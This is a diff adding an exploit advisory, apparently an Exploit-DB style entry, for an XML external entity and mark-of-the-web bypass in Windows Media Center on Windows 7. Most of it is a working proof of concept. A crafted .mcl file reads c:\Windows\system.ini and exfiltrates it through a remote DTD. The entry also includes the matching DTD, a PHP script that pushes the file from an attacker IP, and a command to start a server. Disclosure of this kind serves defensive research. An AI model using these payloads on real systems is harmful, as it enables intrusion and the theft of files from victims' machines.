@@ -1,0 +1,113 @@
+# Exploit Title: Microsoft Windows Media Center 2002 - XML External Entity MotW Bypass
+# Discovery by: hyp3rlinx
+# Date: 2019-12-03
+# Vendor Homepage: www.microsoft.com
+# CVE: N/A
+
+[+] Credits: John Page (aka hyp3rlinx)		
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/WINDOWS-MEDIA-CENTER-MOTW-BYPASS-XXE-ANNIVERSARY-EDITION.txt
+[+] ISR: Apparition Security         
+ 
+
+[Vendor]
+www.microsoft.com
+
+
+[Product]
+Microsoft Windows Media Center
+
+Windows Media Center is a discontinued digital video recorder and media player created by Microsoft.
+Media Center was first introduced to Windows in 2002 on Windows XP Media Center.
+
+
+[Vulnerability Type]
+XML External Entity MotW Bypass (Anniversary Edition)
+
+
+[CVE Reference]
+N/A
+
+
+[Security Issue]
+This vulnerability was originally released by me back on December 4, 2016, yet remains unfixed.
+Now, to make matters worse I will let you know "mark-of-the-web" MotW does not matter here, its just ignored.
+Meaning, if the .MCL file is internet downloaded it gets the MOTW but files still exfiltrated. 
+
+Therefore, I am releasing this "anniversary edition" XXE with important motw informations.
+
+This is a fully working remote information disclosure vulnerability that still affects Windows 7.
+Windows 7 is near end of life this January, yet it is still used by many organizations.
+Furthermore, it seems that Windows 8.1 (Pro) can also run Windows Media Center but I have not tested it.
+
+Host the "FindMeThatBiotch.dtd" DTD file in the web-root of the attacker server Port 80 etc...
+Download the ".mcl" file using Microsoft Internet Explorer.
+
+Check the MotW where you downloaded the .mcl file dir /r and note the Zone.Identifier:$DATA exists.
+Open the file and BOOM! watch shitz leaving!... still vulnerable after all these years lol.
+
+OS: Windows 7 (tested successfully) and possibly Windows 8.1 Pro
+
+
+[Exploit/POC]
+1) "M$-Wmc-Anniversary-Motw-Bypass.mcl"
+
+# PoC
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE knobgobslob [
+<!ENTITY % data666 SYSTEM "c:\Windows\system.ini">
+<!ENTITY % junk SYSTEM "http://<TARGET-IP>/FindMeThatBiotch.dtd">
+%junk;
+%param666;
+%FindMeThatBiotch;
+]>
+
+
+2) "FindMeThatBiotch.dtd"
+<!ENTITY % param666 "<!ENTITY &#x25; FindMeThatBiotch SYSTEM 'http://<TARGET-IP>/%data666;'>">
+
+
+3) Auto exploit PHP .mcl file downloader.
+
+<?php
+$url = 'http://<ATTACKER-IP>/M$-Wmc-Anniversary-Motw-Bypass.mcl';
+header('Content-Type: application/octet-stream');
+header("Content-Transfer-Encoding: Binary"); 
+header("Content-disposition: attachment; filename=\"" . basename($url) . "\""); 
+readfile($url);
+?>
+
+
+4) python -m SimpleHTTPServer 80
+
+
+
+[POC Video URL]
+https://www.youtube.com/watch?v=zcrATpBNAZ0
+
+
+[Network Access]
+Remote
+
+
+
+[Severity]
+High
+
+
+[Disclosure Timeline]
+Vendor Notification:  December 4, 2016
+MSRC "wont fix"
+Dec 2, 2019 : Re-Public "unfixed anniversary" Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
